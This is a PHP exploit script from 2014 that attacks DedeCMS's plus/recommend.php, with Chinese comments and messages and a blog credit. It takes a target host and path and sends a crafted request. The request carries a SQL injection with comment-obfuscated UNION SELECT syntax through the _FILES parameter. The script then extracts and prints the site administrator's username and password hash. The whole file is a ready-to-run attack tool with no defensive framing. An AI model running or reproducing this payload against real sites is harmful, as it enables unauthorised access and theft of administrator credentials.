<?php

/**

 * Created by 独自等待

 * Date: 14-3-3

 * Time: 下午12:58

 * Name: dede_recommend.php

 * 独自等待博客：http://www.waitalone.cn/

 */

print_r('

+------------------------------------------------------+

             DedeCMS recommend.php 注入EXP

             Site：http://www.waitalone.cn/

                Exploit BY： 独自等待

                  Time：2014-03-03

+------------------------------------------------------+

');

if ($argc < 3) {

    print_r('

+------------------------------------------------------+

Useage: php ' . $argv[0] . ' host path

Host: target server (ip/hostname)

Path: path of dedecms

Example: php ' . $argv[0] . ' localhost /dedecms

+------------------------------------------------------+

    ');

    exit;

}

error_reporting(7);

$host = $argv[1];

$path = $argv[2];

$url = "http://$host/$path/plus/recommend.php";

echo '管理员密码获取中，请稍候……' . PHP_EOL;

if (@fopen($url, 'r')) {

    $exp = "$url?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@%60\\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c,userid,0x7c,pwd%29+from+%60%23@__admin%60%20limit+0,1%29,5,6,7,8,9%23@%60\\%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294";

    $info = @file_get_contents($exp);

    if (preg_match('/\|(.*?)\|(.*?)<\/h2>/', $info, $match)) {

        echo '========================================' . PHP_EOL;

        echo '用户名：' . $match[1] . '     密码：' . substr($match[2], 3, 16) . PHP_EOL;

        echo '========================================' . PHP_EOL;

    } else {

        echo '未知错误，请手工尝试！' . PHP_EOL;

    }

} else {

    echo '报告大爷，网站不存在此漏洞！' . PHP_EOL;

}

//统计时间

$start_time = func_time();

//时间统计函数

function func_time()

{

    list($microsec, $sec) = explode(' ', microtime());

    return $microsec + $sec;

}

 

echo '脚本执行时间：' . round((func_time() - $start_time), 4) . '秒';

?>
